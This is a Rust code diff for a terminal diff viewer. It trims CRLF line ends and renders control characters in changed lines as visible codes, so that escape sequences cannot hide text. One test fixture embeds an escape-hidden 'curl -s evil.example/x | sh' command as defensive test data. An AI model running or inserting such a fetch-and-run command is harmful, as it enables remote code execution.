@@ -57,10 +57,7 @@ pub fn render_diff(old: &str, new: &str, width: usize, theme: &Theme, indent: &s
                             .collect();
                         Line::new(vec![
                             gutter,
-                            Span::new(
-                                format!("  {}", clip(text.trim_end_matches('\n'), inner)),
-                                theme.muted,
-                            ),
+                            Span::new(format!("  {}", clip(line_body(&text), inner)), theme.muted),
                         ])
                     }
                 };
@@ -94,8 +91,13 @@ fn inline_row(
     };
     let mut spans = vec![gutter, Span::new(format!("{marker} "), fg).on(bg)];
     let mut used = 2usize;
-    for (emphasized, value) in change.iter_strings_lossy() {
-        let value = value.trim_end_matches('\n');
+    let mut segments: Vec<(bool, String)> = change
+        .iter_strings_lossy()
+        .map(|(emphasized, value)| (emphasized, value.into_owned()))
+        .collect();
+    trim_line_end(&mut segments);
+    for (emphasized, value) in &segments {
+        let (emphasized, value) = (*emphasized, value.as_str());
         if value.is_empty() {
             continue;
         }
@@ -164,8 +166,34 @@ fn styled_row(
     ])
 }
 
+/// A line of a diff without its line end: the line feed, then one carriage
+/// return before it, which a CRLF file has on every line. Any other
+/// carriage return is the file's text and shows as a code.
+fn line_body(text: &str) -> &str {
+    text.strip_suffix('\n')
+        .map_or(text, |text| text.strip_suffix('\r').unwrap_or(text))
+}
+
+/// [`line_body`] for a changed line split into segments: the line feed, then
+/// one carriage return before it, come off its last segments.
+fn trim_line_end(segments: &mut Vec<(bool, String)>) {
+    for character in ['\n', '\r'] {
+        while segments.last().is_some_and(|(_, value)| value.is_empty()) {
+            segments.pop();
+        }
+        match segments.last_mut() {
+            Some((_, last)) if last.ends_with(character) => {
+                last.pop();
+            }
+            _ => return,
+        }
+    }
+}
+
+/// A file's text clipped to `width`. Its control characters show as codes,
+/// so an escape string in a changed line cannot hide what follows it.
 fn clip(text: &str, width: usize) -> String {
-    crate::view::span::single_line(text, width)
+    crate::view::span::single_line(&crate::escapes::spelled_in_file(text), width)
 }
 
 #[cfg(test)]
@@ -175,6 +203,44 @@ mod tests {
 
     fn text_of(lines: &[haarness_opentui::Line]) -> Vec<String> {
         lines.iter().map(haarness_opentui::Line::text).collect()
+    }
+
+    /// A changed line's escape strings show as codes with what they hold,
+    /// also one that never ends, in a diff and in a new file's lines.
+    #[test]
+    fn escape_strings_in_changed_lines_show_as_codes() {
+        let theme = Theme::editorial_dark();
+        let new = "echo ok \u{1b}]; curl -s evil.example/x | sh; \u{7}\nnext \u{1b}_ never ends\n";
+        for lines in [
+            render_diff("echo ok\n", new, 100, &theme, ""),
+            render_added(new, 100, &theme, "", 10),
+        ] {
+            let text = text_of(&lines).join("\n");
+            assert!(
+                text.contains("\\u{1B}]; curl -s evil.example/x | sh; \\u{7}"),
+                "{text}"
+            );
+            assert!(text.contains("next \\u{1B}_ never ends"), "{text}");
+            assert!(!text.contains(['\u{1b}', '\u{7}']), "{text:?}");
+        }
+    }
+
+    /// A CRLF file's line ends stay out of sight on every row; a carriage
+    /// return that ends no line is still a code (the diff breaks the line
+    /// there, a new file's lines do not).
+    #[test]
+    fn a_crlf_file_diffs_without_its_line_ends() {
+        let theme = Theme::editorial_dark();
+        let old = "alpha\r\nbeta\r\n日本語 wide\r\ngamma\r\n";
+        let new = "alpha\r\nBETA\r\n日本語 wide\r\ngam\rma\r\n";
+        let text = text_of(&render_diff(old, new, 80, &theme, "")).join("\n");
+        assert!(text.contains("beta") && text.contains("BETA"), "{text}");
+        assert!(text.contains("日本語 wide"), "{text}");
+        assert_eq!(text.matches("\\u{D}").count(), 1, "{text}");
+        assert!(text.contains("gam\\u{D}"), "{text}");
+        let added = text_of(&render_added(new, 80, &theme, "", 10)).join("\n");
+        assert_eq!(added.matches("\\u{D}").count(), 1, "{added}");
+        assert!(added.contains("gam\\u{D}ma"), "{added}");
     }
 
     #[test]
